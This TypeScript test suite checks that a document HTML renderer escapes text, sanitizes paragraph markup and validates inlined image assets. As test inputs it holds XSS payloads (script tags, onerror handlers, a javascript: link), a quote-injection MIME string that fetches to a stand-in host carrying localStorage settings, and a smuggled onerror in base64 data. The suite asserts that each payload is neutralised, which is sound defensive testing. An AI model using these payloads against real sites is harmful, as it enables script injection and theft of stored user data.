import { describe, it, expect } from "vitest";
import { renderDocumentHtml } from "./doc-render-html";
import type { ProjectDocument } from "./document-model";
import type { Workspace } from "./workspace";
import type { DocumentAsset } from "./document-asset";
import type { ExportAssets } from "./document-export-assets";
import { PRINT_STYLES } from "./download";
import { ASSET_MIME_ALLOWED } from "./document-asset-upload";

// A Workspace has ~30 required slices and this renderer reads only the ones the
// section builders touch, so one narrow cast beats constructing the whole shape.
const ws = {
  tasks: [], raid: [], absences: [], shifts: [], resources: [],
  roles: [], disciplines: [], grades: [], plan: {},
} as unknown as Workspace;

const doc = (blocks: ProjectDocument["blocks"], title = "Report"): ProjectDocument => ({
  id: 1,
  title,
  blocks,
  createdAt: "2026-08-06T00:00:00.000Z",
  updatedAt: "2026-08-06T00:00:00.000Z",
});

const preview = (blocks: ProjectDocument["blocks"]): string =>
  renderDocumentHtml(doc(blocks), ws, "en-US", "preview");

describe("renderDocumentHtml — blocks", () => {
  it("renders headings at the right level", () => {
    expect(preview([{ type: "heading", level: 2, text: "Scope" }])).toContain("<h2>");
    expect(preview([{ type: "heading", level: 1, text: "Scope" }])).toContain("<h1>");
    expect(preview([{ type: "heading", level: 3, text: "Scope" }])).toContain("<h3>");
    expect(preview([{ type: "heading", level: 2, text: "Scope" }])).toContain("Scope");
  });

  it("escapes heading text", () => {
    const html = preview([{ type: "heading", level: 1, text: "<img src=x onerror=alert(1)>" }]);
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;img");
  });

  it("renders bullets as ul and ordered bullets as ol, escaping each item", () => {
    expect(preview([{ type: "bullets", items: ["a"] }])).toContain("<ul>");
    expect(preview([{ type: "bullets", ordered: true, items: ["a"] }])).toContain("<ol>");
    const escaped = preview([{ type: "bullets", items: ["<b>x</b>"] }]);
    expect(escaped).toContain("&lt;b&gt;");
    expect(escaped).not.toContain("<b>");
  });

  it("renders a table with a header row and escapes its cells", () => {
    const html = preview([
      { type: "table", columns: ["Risk", "<Owner>"], rows: [["Vendor", "<AL>"]] },
    ]);
    expect(html).toContain("<th>");
    expect(html).toContain("Vendor");
    expect(html).toContain("&lt;Owner&gt;");
    expect(html).toContain("&lt;AL&gt;");
    expect(html).not.toContain("<Owner>");
  });

  it("renders a table caption only when there is one, and escapes it", () => {
    const withCaption = preview([
      { type: "table", caption: "Q1 <x>", columns: ["A"], rows: [["1"]] },
    ]);
    expect(withCaption).toContain("<caption>");
    expect(withCaption).toContain("Q1 &lt;x&gt;");

    const without = preview([{ type: "table", columns: ["A"], rows: [["1"]] }]);
    expect(without).not.toContain("<caption>");
  });

  // ★★ The escape-then-substitute ORDER in htmlCellWithBreaks. Both other
  // orderings are wrong in a different direction, and only asserting BOTH of
  // these pins it: substituting first would make our own <br> come back as a
  // visible "&lt;br&gt;", and skipping the escape to avoid that would let the
  // literal "<br>" below through as real markup.
  it("maps a newline in a table cell to <br> but escapes a literal <br>", () => {
    expect(preview([{ type: "table", columns: ["A"], rows: [["a\nb"]] }])).toContain("a<br>b");
    const literal = preview([{ type: "table", columns: ["A"], rows: [["<br>"]] }]);
    expect(literal).toContain("&lt;br&gt;");
  });

  it("renders a pageBreak marker in BOTH modes", () => {
    // The marker is emitted either way; only the standalone document carries the
    // stylesheet rule that gives it meaning (asserted in the mode block below).
    expect(preview([{ type: "pageBreak" }])).toMatch(/page-break/);
    expect(renderDocumentHtml(doc([{ type: "pageBreak" }]), ws, "en-US", "standalone")).toMatch(
      /page-break/,
    );
  });
});

describe("renderDocumentHtml — the escaped/unescaped boundary", () => {
  // paragraph.html is the ONE thing that is already-sanitized markup and must
  // pass through as markup. Everything else is plain text and must be escaped.
  // Getting this backwards is either stored XSS or visible tag soup, so both
  // directions are asserted.
  it("passes paragraph html through as MARKUP, not as escaped text", () => {
    const html = preview([{ type: "paragraph", html: "<p>Delivery is <strong>green</strong></p>" }]);
    expect(html).toContain("<strong>green</strong>");
    expect(html).not.toContain("&lt;strong&gt;");
  });

  it("sanitizes paragraph html at the sink", () => {
    // ★★ This is the layer that actually holds: the CSV/MD/Turso decoders
    // hand-build entities and never sanitize, and document-model.ts is DOM-free
    // by contract and cannot.
    const html = preview([{ type: "paragraph", html: "<p>ok</p><script>alert(1)</script>" }]);
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toContain("alert(1)");
    expect(html).toContain("ok");
  });

  it("drops a javascript: href from paragraph html", () => {
    const html = preview([{ type: "paragraph", html: `<p><a href="javascript:alert(1)">x</a></p>` }]);
    expect(html).not.toContain("javascript:");
  });

  // ★★ The sink is the DOCUMENTS allow-list, not the shared template one. The
  // assertions carry the CLOSING bracket on purpose: "<s" is a prefix of
  // <strong>/<sub>/<sup>/<span> and "<mark" of nothing today but of any future
  // tag starting the same way, so a bracket-less toContain would stay green with
  // `s` dropped from DOCUMENT_ALLOWED_TAGS as long as some <strong> survived.
  it("renders a document paragraph's new marks instead of stripping them", () => {
    const html = preview([
      { type: "paragraph", html: "<p><mark>hi</mark> <s>gone</s> <code>x</code></p>" },
    ]);
    expect(html).toContain("<mark>hi</mark>");
    expect(html).toContain("<s>gone</s>");
    expect(html).toContain("<code>x</code>");
  });

  // ★★★ THIS PINNED THE OPPOSITE UNTIL THE ALLOW-LISTS MERGED. While
  // sanitizeDocumentHtml carried a list of its own, `h3` was on no list, so this
  // input UNWRAPPED to a bare "Sub" and the test asserted exactly that.
  // DOCUMENT_ALLOWED_TAGS now SPREADS RICH_ALLOWED_TAGS, which carries h1-h4, so
  // the heading SURVIVES. Measured through the real renderer, not reasoned:
  // "<h3>Sub</h3>" renders as "<h3>Sub</h3>".
  // ★★ Assert the BYTES. The word "Sub" survives the unwrap, the keep AND the
  // escape alike, so toContain("Sub") cannot tell the three apart — and the old
  // `not.toContain("<h3")` was itself satisfied by the ESCAPED form, which is how
  // it stayed green while a narrower classifier turned this very input into
  // literal "<p>&lt;h3&gt;Sub&lt;/h3&gt;</p>". Both directions have to be named.
  it("keeps a heading tag inside paragraph html, which the documents list now carries", () => {
    const html = preview([{ type: "paragraph", html: "<h3>Sub</h3>" }]);
    expect(html).toContain("<h3>Sub</h3>");
    expect(html).not.toContain("&lt;h3");
  });

  // ★★ The unwrap-keeps-the-words property the test above used to carry, moved to
  // an input that is genuinely off every list. `h5` is the sharpest one left: the
  // editor schema stops at h4 (`heading: { levels: [1, 2, 3, 4] }`), so h5 can only
  // reach this sink from legacy stored data, and it is the one heading level that
  // still unwraps. Measured: "<h5>Deep</h5>" renders as bare "Deep".
  // ★★★ Losing the TAG and keeping the WORDS is the whole point — the retired
  // sanitizeNoteHtml set KEEP_CONTENT:false and deleted the text along with the
  // tag, which was the §137 data loss. Do not relax this to toContain("Deep")
  // alone: the keep satisfies that too, so it could not see a regression that
  // started admitting h5.
  it("unwraps a tag no allow-list carries but keeps its text", () => {
    const html = preview([{ type: "paragraph", html: "<h5>Deep</h5>" }]);
    expect(html).toContain("Deep");
    expect(html).not.toContain("<h5");
    expect(html).not.toContain("&lt;h5");
  });

  it("does not escape a paragraph opening with a tag the allow-list omits", () => {
    // Both of these open with a tag no DERIVED sink carries — `div` and `table`
    // are absent from SINK_TAGS.rich, .document and .projection alike — so a
    // classifier built from an allow-list calls the whole value plain text and
    // escapes it, strictly worse than the unwrap above, which is what the "render"
    // sink exists to prevent. ★ `<h3>` used to be a third row here and no longer
    // belongs: the derivation put it ON every sink, so its not-escaped property is
    // pinned by name in the dedicated test above, together with the bytes it keeps.
    for (const [input, escaped] of [
      ["<div>Status</div>", "&lt;div"],
      ["<table><tr><td>cell</td></tr></table>", "&lt;table"],
    ]) {
      const html = preview([{ type: "paragraph", html: input }]);
      expect(html).not.toContain(escaped);
    }
    expect(preview([{ type: "paragraph", html: "<div>Status</div>" }])).toContain("Status");
    expect(
      preview([{ type: "paragraph", html: "<table><tr><td>cell</td></tr></table>" }]),
    ).toContain("cell");
  });

  it("does not escape markup that starts mid-value instead of opening the value", () => {
    // ★★★ The render classifier asks "does this CONTAIN a tag at all?", not
    // "does it START with one" — a storage sink asks the second question because
    // the escaped form is what it persists, but nothing is stored here and the
    // sink keeps every tag's text, so the only failure left is escaping real
    // markup. While it was anchored, this arrived as literal "&lt;strong&gt;" in
    // the preview, the print/PDF path, and (via the sibling renderers) Word and
    // PowerPoint.
    const html = preview([{ type: "paragraph", html: "Intro <strong>bold</strong> tail" }]);
    // POSITIVE form first: the absence assertion below is satisfied by an empty
    // string too.
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("Intro");
    expect(html).not.toContain("&lt;strong");
  });

  it("does not escape UPPERCASE legacy markup (open-followups §141(d))", () => {
    // CONTAINS_TAG is case-INSENSITIVE. Dropping its /i leaves the whole suite
    // green while <P>/<STRONG> get escaped into Word, PowerPoint, the HTML
    // preview and the PDF — no fixture in any of those files carried an
    // uppercase-markup value, so this is that fixture and the ONLY detector.
    // POSITIVE form first: an absence assertion alone is satisfied by an empty
    // string, which is exactly what the mutant must not be allowed to pass on.
    // DOMPurify lower-cases the tag name it emits, so the surviving element is
    // <strong> whatever case arrived.
    const html = preview([{ type: "paragraph", html: "Intro <STRONG>bold</STRONG> tail" }]);
    expect(html).toMatch(/<strong>bold<\/strong>/i);
    expect(html).toContain("Intro");
    expect(html).not.toMatch(/&lt;strong/i);
  });
});

describe("renderDocumentHtml — data sections", () => {
  it("resolves a dataSection against the live workspace", () => {
    const wsWithRaid = {
      ...ws,
      raid: [{ id: 1, title: "Vendor delay", category: "Risk", status: "Open" }],
    } as unknown as Workspace;
    const html = renderDocumentHtml(
      doc([{ type: "dataSection", key: "raid" }]),
      wsWithRaid,
      "en-US",
      "preview",
    );
    expect(html).toContain("Vendor delay");
    expect(html).toContain("<table>");
  });

  it("renders an empty dataSection as nothing rather than a bare header", () => {
    const html = preview([{ type: "dataSection", key: "raid" }]);
    expect(html).not.toContain("<table");
    expect(html).toBe("");
  });

  // ★★ A dataSection resolves through the REAL buildExportSections, so since
  // §141(b) its rich columns arrive as RichCell and must render as markup — a
  // document embedding the RAID register gets the same fidelity as the
  // register's own export. This is the reason tableHtml's `rows` widened from
  // `string | number` to ExportCell; a `table` BLOCK still cannot hold one.
  it("renders a rich column of a dataSection as markup, not escaped text", () => {
    const wsWithRaid = {
      ...ws,
      raid: [
        {
          id: 1,
          title: "Vendor delay",
          category: "Risk",
          status: "Open",
          description: "<h3>Impact</h3><ul><li><p>slippage</p></li></ul>",
        },
      ],
    } as unknown as Workspace;
    const html = renderDocumentHtml(
      doc([{ type: "dataSection", key: "raid" }]),
      wsWithRaid,
      "en-US",
      "preview",
    );
    expect(html).toContain("<h3>Impact</h3>");
    expect(html).toContain("<li><p>slippage</p></li>");
    expect(html).not.toContain("&lt;h3&gt;");
  });

  // ★★ MEASURED GAP, not a precaution. Dropping sanitizeRichHtml from
  // exportCellHtml left this whole file green while export.test.ts went red —
  // the two surfaces share one helper today, and a document is the artifact
  // most likely to be handed to a client, so the guard is pinned on both sides.
  it("re-sanitizes a rich dataSection column at the sink", () => {
    const wsWithRaid = {
      ...ws,
      raid: [
        {
          id: 1,
          title: "Vendor delay",
          category: "Risk",
          status: "Open",
          description: '<p onclick="x()">hi</p><script>bad()</script>',
        },
      ],
    } as unknown as Workspace;
    const html = renderDocumentHtml(
      doc([{ type: "dataSection", key: "raid" }]),
      wsWithRaid,
      "en-US",
      "preview",
    );
    expect(html).toContain("hi");
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("bad()");
  });

  it("still escapes a NON-rich column of the same dataSection", () => {
    const wsWithRaid = {
      ...ws,
      raid: [{ id: 1, title: "<b>Vendor</b>", category: "Risk", status: "Open" }],
    } as unknown as Workspace;
    const html = renderDocumentHtml(
      doc([{ type: "dataSection", key: "raid" }]),
      wsWithRaid,
      "en-US",
      "preview",
    );
    expect(html).toContain("&lt;b&gt;Vendor&lt;/b&gt;");
    expect(html).not.toContain("<td><b>Vendor</b></td>");
  });
});

describe("renderDocumentHtml — modes", () => {
  it("standalone emits a full document, preview does not", () => {
    expect(renderDocumentHtml(doc([]), ws, "en-US", "standalone")).toMatch(/^<!DOCTYPE html>/);
    expect(renderDocumentHtml(doc([]), ws, "en-US", "preview")).not.toMatch(/DOCTYPE/);
  });

  it("preview of an empty document is the empty string", () => {
    expect(renderDocumentHtml(doc([]), ws, "en-US", "preview")).toBe("");
  });

  it("standalone carries PRINT_STYLES and defines the page-break rule", () => {
    const html = renderDocumentHtml(doc([]), ws, "en-US", "standalone");
    expect(html).toContain("@page");
    expect(html).toMatch(/\.page-break\s*\{/);
  });

  it("emits the task-list and alignment rules in standalone mode", () => {
    const html = renderDocumentHtml(doc([]), ws, "en-US", "standalone");
    expect(html).toContain('[data-align="center"]');
    expect(html).toContain('li[data-type="taskItem"]');
  });

  it("preview is a bare fragment with no <style> block at all", () => {
    // The absence that matters is the whole stylesheet, not just one rule: a
    // fragment is injected into a page that already has its own styles.
    const html = preview([{ type: "heading", level: 1, text: "x" }]);
    expect(html).not.toContain("<style");
    expect(html).not.toContain("@page");
    expect(html).not.toContain("portrait");
  });

  it("standalone overrides the shared landscape @page with portrait", () => {
    const html = renderDocumentHtml(doc([]), ws, "en-US", "standalone");
    expect(html).toContain("size: A4 portrait");
  });

  // ★★★ The override works ONLY because it comes later in the cascade, so
  // asserting that both strings are present would pass with the rules in the
  // wrong order and the document silently printing landscape. Both checks below
  // are guarded against the vacuous case where the anchor is missing entirely
  // (indexOf returning -1 would make a naive `>` comparison trivially true).
  it("emits the portrait override AFTER PRINT_STYLES, or the cascade loses", () => {
    const html = renderDocumentHtml(doc([]), ws, "en-US", "standalone");

    // Anchor 1: the shared constant, verbatim. Robust to its content changing.
    const stylesAt = html.indexOf(PRINT_STYLES);
    expect(stylesAt).toBeGreaterThan(-1);
    expect(html.indexOf("size: A4 portrait")).toBeGreaterThan(stylesAt + PRINT_STYLES.length - 1);

    // Anchor 2: the declaration actually being overridden. This is the one that
    // states the cascade outcome — the last `size` for the page context wins.
    const landscapeAt = html.indexOf("landscape");
    expect(landscapeAt).toBeGreaterThan(-1);
    expect(html.indexOf("portrait")).toBeGreaterThan(landscapeAt);
  });

  it("standalone shows the title in <title> and <h1>, escaped in both", () => {
    const html = renderDocumentHtml(doc([], `Q1 <img> "report"`), ws, "en-US", "standalone");
    expect(html).toContain("<title>Q1 &lt;img&gt; &quot;report&quot;</title>");
    expect(html).toContain("<h1>Q1 &lt;img&gt; &quot;report&quot;</h1>");
    expect(html).not.toContain("<img>");
  });

  // ★★ The document's lang attribute must follow the `lang` argument. A German
  // document declaring lang="en" is a WCAG 3.1.1 failure and makes a screen
  // reader pronounce it with an English voice.
  it("declares the document language from the lang argument", () => {
    expect(renderDocumentHtml(doc([]), ws, "de", "standalone")).toContain(`<html lang="de">`);
    expect(renderDocumentHtml(doc([]), ws, "en-GB", "standalone")).toContain(
      `<html lang="en-GB">`,
    );
  });

  it("joins several blocks in document order", () => {
    const html = preview([
      { type: "heading", level: 1, text: "First" },
      { type: "bullets", items: ["Second"] },
    ]);
    expect(html.indexOf("First")).toBeLessThan(html.indexOf("Second"));
  });
});

// S3c-1: images are referenced in block html as `<img data-asset-id="…">`
// and never inlined into stored HTML — the `assets` param is the ONLY place
// this renderer is handed real bytes, and only standalone mode may use them
// (see inlineDocumentImages's own doc comment on doc-render-html.ts).
describe("renderDocumentHtml — S3c-1 image inlining", () => {
  function assetMeta(id: string, mime: string): DocumentAsset {
    return { id, name: `${id}.png`, mime, size: 3, hash: "h", createdAt: "2026-08-06T00:00:00.000Z" };
  }

  const withImage = [{ type: "paragraph", html: '<p><img data-asset-id="a1" alt="Sunset"></p>' }] as const;

  it("does nothing in preview mode, even when assets are supplied", () => {
    const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", "image/png")] } as Workspace;
    const withAssets = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "preview", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set() });
    const withoutAssets = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "preview");
    expect(withAssets).toBe(withoutAssets);
    expect(withAssets).not.toContain("base64");
    expect(withAssets).toContain('data-asset-id="a1"');
  });

  // ★★ THIS ASSERTED THE OPPOSITE UNTIL S3c-2, and the change is deliberate.
  // The `assets` argument now DEFAULTS to NO_EXPORT_ASSETS instead of being
  // absent, so a referenced id sits in no bucket and is disclosed. The rendered
  // result is the same nothing either way — an `<img>` with no src — but the
  // old form said nothing about it, which is the state a caller that simply
  // FORGOT to load assets lands in. Marking it makes that visible.
  it("standalone with no assets argument discloses the image rather than emitting a silent src-less tag", () => {
    const html = renderDocumentHtml(doc([...withImage]), ws, "en-US", "standalone");
    expect(html).toContain('data-asset-id="a1"');
    expect(html).toContain('data-asset-missing="true"');
    expect(html).not.toContain("base64");
  });

  it("standalone inlines a known asset as a base64 data: URI, using the mime from ws.documentAssets", () => {
    const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", "image/png")] } as Workspace;
    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set() });
    expect(html).toContain('src="data:image/png;base64,QUJD"');
    expect(html).toContain('data-asset-id="a1"');
    expect(html).not.toContain(`data-asset-missing="true"`);
  });

  it("marks a referenced id absent from the assets map as missing, without a src", () => {
    const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", "image/png")] } as Workspace;
    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: {}, omitted: new Set(), missing: new Set() });
    expect(html).toContain('data-asset-missing="true"');
    expect(html).not.toContain("src=");
  });

  // ★★ THE MIME DEFECT THIS RENDERER MUST NOT REPEAT: bytes with no resolvable
  // mime are treated as unresolved rather than guessed at — an <img> src with a
  // wrong or absent MIME is a content-sniffing gamble, not a safe fallback.
  it("marks an id present in the assets map as missing when no mime is known for it", () => {
    // ws carries no documentAssets metadata for "a1" at all.
    const html = renderDocumentHtml(doc([...withImage]), ws, "en-US", "standalone", { inlined: { a1: "QUJD" }, omitted: new Set(), missing: new Set() });
    expect(html).toContain('data-asset-missing="true"');
    expect(html).not.toContain("src=");
    expect(html).not.toContain("base64");
  });
});

// ★★★ The `mime` and `data` reaching the renderer come off the LOAD path, where
// `sanitizeDocumentAsset` runs mime through `sanitizeText` — which only trims
// and clips. It strips no quote and never consults the upload allowlist, so a
// hostile project file can carry an attribute-breaking mime. These assert on the
// PARSED result, never on a substring of the raw HTML: a raw-string assertion is
// exactly the class of test that would let an injected `onerror` ship green.
describe("renderDocumentHtml — S3c-1 image inlining is validated at the SINK", () => {
  function assetMeta(id: string, mime: string): DocumentAsset {
    return { id, name: `${id}.png`, mime, size: 3, hash: "h", createdAt: "2026-08-06T00:00:00.000Z" };
  }

  const withImage = [{ type: "paragraph", html: '<p><img data-asset-id="a1" alt="Sunset"></p>' }] as const;

  /** Parse the rendered standalone HTML and hand back the asset <img>. */
  function renderedImg(mime: string, data: string): HTMLImageElement {
    const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", mime)] } as Workspace;
    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { inlined: { a1: data }, omitted: new Set(), missing: new Set() });
    const host = document.createElement("div");
    host.innerHTML = html.slice(html.indexOf("<body>") + "<body>".length);
    const img = host.querySelector("img[data-asset-id]");
    expect(img).not.toBeNull();
    return img as HTMLImageElement;
  }

  it("renders the data: URI for an allowed mime", () => {
    const img = renderedImg("image/png", "QUJD");
    expect(img.getAttribute("src")).toBe("data:image/png;base64,QUJD");
    expect(img.getAttribute("data-asset-missing")).toBeNull();
  });

  it("renders every mime the upload allowlist admits", () => {
    for (const mime of ASSET_MIME_ALLOWED) {
      expect(renderedImg(mime, "QUJD").getAttribute("src")).toBe(`data:${mime};base64,QUJD`);
    }
  });

  it("falls through to data-asset-missing for a quote-injection mime, minting no event handler", () => {
    const hostile =
      `image/png" onerror="fetch('https://evil.test/'+localStorage.getItem('aipm-cockpit:settings'))`;
    const img = renderedImg(hostile, "QUJD");
    expect(img.getAttribute("onerror")).toBeNull();
    expect(img.getAttribute("src")).toBeNull();
    expect(img.getAttribute("data-asset-missing")).toBe("true");
  });

  it("falls through for image/svg+xml — escaping alone would still leave an XSS surface", () => {
    // The upload allowlist excludes SVG; the load path does not, so the sink
    // must exclude it independently.
    const img = renderedImg("image/svg+xml", "QUJD");
    expect(img.getAttribute("src")).toBeNull();
    expect(img.getAttribute("data-asset-missing")).toBe("true");
  });

  it("falls through when data is not base64 — the Turso column validates no charset", () => {
    const img = renderedImg("image/png", `AAAA" onerror="alert(1)`);
    expect(img.getAttribute("onerror")).toBeNull();
    expect(img.getAttribute("src")).toBeNull();
    expect(img.getAttribute("data-asset-missing")).toBe("true");
  });
});

// ★★★ S3c-2: THE THREE BUCKETS ARE THREE DIFFERENT MESSAGES TO THE READER of
// the exported file. `inlined` carries bytes; `omitted` means the export's byte
// budget was already spent (a POLICY decision — the image is intact, it just is
// not here); `missing` means there is no byte row or the load failed (a DATA
// problem). Presenting an omitted image with the broken-image marker tells a
// user their image is lost when it is not, so the two branches must stay
// distinguishable in the output, not merely in the type.
describe("renderDocumentHtml — S3c-2 standalone image branches", () => {
  const PNG_B64 = "iVBORw0KGgo=";

  const assetMeta = (name: string): DocumentAsset => ({
    id: "a1",
    name,
    mime: "image/png",
    size: 3,
    hash: "h",
    createdAt: "2026-08-06T00:00:00.000Z",
  });

  const wsWithAsset = (name = "chart.png") =>
    ({ ...ws, documentAssets: [assetMeta(name)] }) as Workspace;

  const docWith = (html: string): ProjectDocument => doc([{ type: "paragraph", html }]);

  const IMG = '<p><img data-asset-id="a1" alt="c"></p>';

  const html = (assets: ExportAssets, name?: string): string =>
    renderDocumentHtml(docWith(IMG), wsWithAsset(name), "en-US", "standalone", assets);

  it("inlines a data: URI when the asset is inlined", () => {
    const out = html({ inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set() });
    expect(out).toContain(`src="data:image/png;base64,${PNG_B64}"`);
    expect(out).not.toContain(`data-asset-missing="true"`);
  });

  it("substitutes the SAME placeholder text as docx when omitted by budget", () => {
    const out = html({ inlined: {}, omitted: new Set(["a1"]), missing: new Set() });
    expect(out).toContain("[Image: chart.png]");
    // An omitted image is a policy decision, not a broken one.
    expect(out).not.toContain(`data-asset-missing="true"`);
    // ★ Scoped deliberately: PRINT_STYLES + DOCUMENT_PAGE_STYLES contain no
    // `<img`, and the page shell emits none either — measured, so the blunt
    // assertion really does mean "the tag this branch replaced is gone".
    expect(out).not.toContain("<img");
  });

  // ★★★ THE ESCAPE IS THE ONLY GUARD ON THIS PATH. The asset NAME is
  // user-editable (the rename control) and it
  // lands in the output of a file people open in a browser — and it is
  // substituted into the paragraph AFTER `sanitizeDocumentHtml` has already
  // run, so `htmlEscape` is the ONLY thing between a renamed asset and script
  // execution. Drop the escape and this test goes red.
  it("escapes the asset name in the placeholder — the substitution runs post-sanitize", () => {
    const out = html(
      { inlined: {}, omitted: new Set(["a1"]), missing: new Set() },
      `<script>alert(1)</script>.png`,
    );
    expect(out).not.toContain("<script>");
    expect(out).toContain("&lt;script&gt;alert(1)&lt;/script&gt;.png");
  });

  it("marks a missing asset, and the standalone stylesheet can draw the marker", () => {
    const out = html({ inlined: {}, omitted: new Set(), missing: new Set(["a1"]) });
    expect(out).toContain(`data-asset-missing="true"`);
    // ★ The marker is styled ONLY in globals.css, which a standalone file never
    // loads — so the rule must be inlined here or the attribute draws nothing.
    expect(out).toContain("img[data-asset-missing]");
  });

  // ★★★ A KNOWN HOLE IN `loadExportAssets`, closed HERE and only here. That
  // function treats a present-but-EMPTY base64 row as `inlined` (it costs no
  // budget) on the stated assumption that "the renderers' own validity checks
  // then decline it". `assetSrcAttr` IS that check. If it ever stopped
  // declining, the asset would sit in NO bucket the user is told about —
  // neither visibly inlined, nor omitted, nor missing — and a `src="data:…;
  // base64,"` would render nothing at all with no explanation.
  it("declines an empty base64 string rather than emitting a src that renders nothing", () => {
    const out = html({ inlined: { a1: "" }, omitted: new Set(), missing: new Set() });
    expect(out).not.toContain(`src="data:`);
    expect(out).toContain(`data-asset-missing="true"`);
  });

  // ★★★ BOTH SPELLINGS APPEAR IN STORED DOCUMENTS, AND ONLY ONE EVER REACHES
  // THE SUBSTITUTION. Measured, not reasoned: rendering the self-closing input
  // below and printing the line that survives gives
  // `<p><img data-asset-id="a1" alt="c" src="data:…"></p>` — no trailing
  // slash. `sanitizeDocumentHtml` re-serialises through the DOM, and the HTML
  // serialiser writes a void element without one, so `tag.endsWith("/>")` in
  // `inlineDocumentImages` is FALSE for every input this renderer can be given.
  // ★★ Consequence for anyone mutation-testing this file: replacing that
  // expression with a literal `false` leaves the whole suite GREEN. That is an
  // UNREACHABLE branch, not a missing test — no input to `renderDocumentHtml`
  // can produce a self-closing tag, so no test at this layer can kill it. The
  // branch is kept for a caller that hands `inlineDocumentImages` HTML which
  // has not been through the sanitizer.
  // What this test therefore pins is the END-TO-END result for both spellings:
  // a correctly rewritten image and no stray punctuation left as visible text.
  it("rewrites both the bare and the self-closing <img> spellings", () => {
    for (const raw of [
      '<p><img data-asset-id="a1" alt="c"></p>',
      '<p><img data-asset-id="a1" alt="c" /></p>',
    ]) {
      const out = renderDocumentHtml(
        docWith(raw),
        wsWithAsset(),
        "en-US",
        "standalone",
        { inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set() },
      );
      const host = document.createElement("div");
      host.innerHTML = out.slice(out.indexOf("<body>") + "<body>".length);
      const img = host.querySelector("img[data-asset-id]");
      expect(img).not.toBeNull();
      expect(img?.getAttribute("src")).toBe(`data:image/png;base64,${PNG_B64}`);
      expect(img?.getAttribute("alt")).toBe("c");
      // No stray "/" or ">" left as visible text beside the image. Scoped to
      // the image's own paragraph — the body slice also carries the page
      // header and footer, whose text is not what this is about.
      expect(img?.closest("p")?.textContent).toBe("");
    }
  });

  it("preview mode is untouched by any of this", () => {
    const out = renderDocumentHtml(
      docWith('<p><img data-asset-id="a1"></p>'),
      wsWithAsset(),
      "en-US",
      "preview",
      { inlined: { a1: PNG_B64 }, omitted: new Set(), missing: new Set() },
    );
    expect(out).not.toContain("data:image/png");
    expect(out).toContain(`data-asset-id="a1"`);
  });
});
